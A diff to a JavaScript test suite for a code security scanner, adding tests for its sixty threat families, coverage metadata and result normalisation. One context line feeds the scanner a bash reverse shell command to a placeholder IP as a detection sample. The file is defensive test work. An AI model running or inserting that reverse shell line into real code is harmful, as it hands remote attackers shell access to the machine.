@@ -21,7 +21,38 @@ Module._load = function patchedLoad(request, parent, isMain) {
 };
 
 const scan = require("../api/scan");
-const { runStaticScan, mergeStaticThreats } = scan._test;
+const { runStaticScan, mergeStaticThreats, normalizeResult, THREAT_FAMILIES, coverageMetadata } = scan._test;
+
+function testCanonicalSixtyFamilies() {
+  assert.equal(THREAT_FAMILIES.length, 60);
+  assert.equal(new Set(THREAT_FAMILIES).size, 60);
+  for (const family of THREAT_FAMILIES) {
+    assert.match(family, /^[A-Z0-9_]+$/);
+  }
+}
+
+function testCoverageMetadata() {
+  const coverage = coverageMetadata();
+  assert.equal(coverage.total_families, 60);
+  assert.equal(coverage.ai_families, 60);
+  assert.ok(coverage.static_families >= 7);
+  assert.ok(coverage.static_covered_families.includes("REVERSE_SHELL"));
+}
+
+function testNormalizeAddsSixtyFamilyMetadata() {
+  const result = normalizeResult({
+    status: "STATUS_SAFE",
+    threat_score: 0,
+    threats: [{ family: "NOT_A_REAL_FAMILY", severity: "LOW" }],
+  });
+  assert.equal(result.threat_families_checked.length, 60);
+  assert.equal(result.coverage.total_families, 60);
+  assert.equal(result.threats[0].family, "UNCLASSIFIED");
+  assert.equal(result.threats[0].original_family, "NOT_A_REAL_FAMILY");
+  const normalizedAgain = normalizeResult(result);
+  assert.equal(normalizedAgain.threats[0].family, "UNCLASSIFIED");
+  assert.equal(normalizedAgain.threats[0].original_family, "NOT_A_REAL_FAMILY");
+}
 
 function testStaticReverseShell() {
   const result = runStaticScan('const { exec } = require("child_process"); exec("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1");');
@@ -64,5 +95,8 @@ testStaticReverseShell();
 testStaticSecretRead();
 testStaticPromptInjection();
 testStaticMergeCannotDowngrade();
+testCanonicalSixtyFamilies();
+testCoverageMetadata();
+testNormalizeAddsSixtyFamilyMetadata();
 
 console.log("scan-security tests: ok");
